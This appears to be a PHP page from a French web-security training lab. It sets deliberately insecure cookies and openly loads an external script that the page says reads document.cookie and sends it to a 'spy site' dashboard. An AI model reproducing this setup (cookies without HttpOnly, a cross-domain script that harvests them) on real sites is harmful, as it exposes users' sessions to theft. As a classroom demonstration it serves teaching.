<?php
declare(strict_types=1);
$who = $_COOKIE['whoami'] ?? 'inconnu';
$theme = ($_COOKIE['demo_theme'] ?? 'blue') === 'red' ? 'red' : 'blue';
$themeLabel = $theme === 'red' ? 'rouge' : 'bleue';
?>
<!doctype html>
<html lang="fr">
<meta charset="utf-8">
<title>Lab A · welcome</title>
<style>
  body { font: 16px/1.45 system-ui, sans-serif; max-width: 36rem; margin: 10vh auto; color: #0B1220; background: #EFF6FF; }
  body.theme-red { color: #450A0A; background: #FFF1F2; }
  code, pre { font-family: ui-monospace, Consolas, monospace; background: #0B1220; color: #E2E8F0; padding: .15rem .35rem; }
  pre { padding: .8rem 1rem; overflow: auto; }
  .warn { color: #DC2626; font-weight: 650; }
  .button { display: inline-block; margin-top: .5rem; padding: .55rem .8rem; color: #fff; background: #1D4ED8; text-decoration: none; }
  .theme-state { padding: .75rem; border-left: 4px solid #2563EB; background: #EFF6FF; font-weight: 650; }
  .theme-red .theme-state { border-left-color: #DC2626; background: #FFFFFF; }
</style>
<body class="theme-<?= $theme ?>">
<h1>Bienvenue, <?= htmlspecialchars($who, ENT_QUOTES) ?></h1>
<p class="warn">Deux cookies volontairement vulnérables viennent d’être posés : <code>session</code> et <code>whoami</code>. Ils couvrent <code>.dercetech.com</code> et <code>/</code>, sans <code>HttpOnly</code> ni <code>Secure</code>. Leur attribut <code>SameSite</code> vaut <code>Lax</code>.</p>
<p id="theme-state" class="theme-state">Le cookie <code>demo_theme</code> vaut <strong><?= $theme ?></strong> : la couleur de fond est <?= $themeLabel ?>.</p>
<p><code>demo_theme</code> utilise <code>SameSite=Lax</code> et n’a volontairement pas l’attribut <code>HttpOnly</code>. Vous pouvez donc le voir dans DevTools et dans le résultat de <code>document.cookie</code>. Sa valeur appartient à ce navigateur : elle n’est pas partagée avec les autres élèves.</p>
<p>Ouvrez DevTools → Application → Cookies, puis tapez dans la Console :</p>
<pre>document.cookie

const who = document.cookie.split('; ')
  .find(r => r.startsWith('whoami='))
  ?.split('=')[1];
console.log('on te voit :', decodeURIComponent(who));</pre>
<p>Ouvrez le <a href="https://training.bad-sector.games/secu-5d/day1/s2/" target="_blank" rel="noopener">tableau de bord du site espion</a> pour voir les données reçues pendant la démonstration. Utilisez uniquement les valeurs fictives de ce laboratoire.</p>
<p><strong>Démonstration D1/S2 :</strong> cette page charge volontairement le script visible <a href="https://training.bad-sector.games/secu-5d/day1/s2/library.js">library.js</a>. Il lit <code>document.cookie</code>, puis envoie cette valeur et le marqueur du laboratoire vers le site espion. Celui-ci conserve au maximum 20 envois.</p>
<p><a class="button" href="index.html">Retour au login</a></p>
<p><a href="../">Revenir aux consignes du lab</a></p>
<!-- D1/S2 training demo: intentionally visible cross-domain script import. -->
<script src="https://training.bad-sector.games/secu-5d/day1/s2/library.js"></script>
